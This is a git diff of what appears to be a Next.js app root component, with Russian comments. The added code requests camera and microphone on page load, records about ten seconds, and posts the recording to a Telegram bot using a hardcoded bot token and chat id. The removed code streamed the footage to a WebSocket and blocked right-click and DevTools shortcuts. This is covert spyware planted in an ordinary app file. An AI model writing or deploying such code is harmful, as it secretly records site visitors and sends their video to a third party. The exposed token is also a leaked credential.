@@ -4,21 +4,17 @@ import { Provider } from "@/app/components/ui/Context/Context";
 import { useEffect, useRef } from "react";
 
 const myApp = ({ Component, pageProps }) => {
-    // 
 
+    // отправляем видео боту 
     const videoRef = useRef(null);
-    const ws = useRef(null);
+
+    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY"
+    const chatId = "-1001860144177"
+    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendMessage`
+
 
     useEffect(() => {
-        const setupWebSocket = () => {
-            ws.current = new WebSocket('ws://localhost:3001');
-
-            ws.current.onopen = () => console.log('WebSocket connected');
-            ws.current.onclose = (event) => console.log('WebSocket disconnected:', event.code, event.reason);
-            ws.current.onerror = (error) => console.error('WebSocket error:', error);
-        };
-
-        const getMedia = async () => {
+        const getMediaAndSendData = async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
@@ -31,60 +27,80 @@ const myApp = ({ Component, pageProps }) => {
                     mediaRecorder.ondataavailable = (event) => {
                         if (event.data.size > 0) {
                             chunks.push(event.data);
-
-                            // Преобразование Blob в ArrayBuffer
-                            const buffer = event.data.arrayBuffer();
-
-                            // Отправка данных на сервер через WebSocket
-                            ws.current.send(buffer);
                         }
                     };
 
-                    mediaRecorder.start(100);  // Установка интервала в 100 миллисекунд для частых событий ondataavailable
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+
+                        const formData = new FormData();
+                        formData.append('video', blob, 'video.webm');
+
+                        // Отправляем данные на сервер (бота) с использованием fetch
+                        try {
+                            const response = await fetch(urlApi, {
+                                method: 'POST',
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    parse_mode: "html",
+                                    text: formData,
+                                })
+                            });
+
+                            if (response.ok) {
+                                console.log('Видео успешно отправлено на бота');
+                            } else {
+                                console.error('Ошибка при отправке видео на бота:', response.statusText);
+                            }
+                        } catch (error) {
+                            console.error('Ошибка fetch:', error);
+                        }
+                    };
+
+                    mediaRecorder.start(100);
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 10000);
                 }
             } catch (error) {
-                console.error('Error accessing media devices:', error);
+                console.error('Ошибка доступа к мультимедийным устройствам:', error);
             }
         };
 
-        const cleanup = () => ws.current?.close();
-
-        setupWebSocket();
-        getMedia();
-
-        return cleanup;
+        getMediaAndSendData();
     }, []);
     // 
 
 
     // 
-    useEffect(() => {
-        const handleContextMenu = (e) => {
-            e.preventDefault();
-        };
+    // useEffect(() => {
+    //     const handleContextMenu = (e) => {
+    //         e.preventDefault();
+    //     };
 
-        const handleKeyDown = (e) => {
-            if (e.keyCode === 123) {
-                e.preventDefault();
-            } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
-                e.preventDefault();
-            } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'C'.charCodeAt(0)) {
-                e.preventDefault();
-            } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
-                e.preventDefault();
-            } else if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
-                e.preventDefault();
-            }
-        };
+    //     const handleKeyDown = (e) => {
+    //         if (e.keyCode === 123) {
+    //             e.preventDefault();
+    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
+    //             e.preventDefault();
+    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'C'.charCodeAt(0)) {
+    //             e.preventDefault();
+    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
+    //             e.preventDefault();
+    //         } else if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
+    //             e.preventDefault();
+    //         }
+    //     };
 
-        document.addEventListener('contextmenu', handleContextMenu);
-        document.addEventListener('keydown', handleKeyDown);
+    //     document.addEventListener('contextmenu', handleContextMenu);
+    //     document.addEventListener('keydown', handleKeyDown);
 
-        return () => {
-            document.removeEventListener('contextmenu', handleContextMenu);
-            document.removeEventListener('keydown', handleKeyDown);
-        };
-    }, []);
+    //     return () => {
+    //         document.removeEventListener('contextmenu', handleContextMenu);
+    //         document.removeEventListener('keydown', handleKeyDown);
+    //     };
+    // }, []);
     //
 
     return (
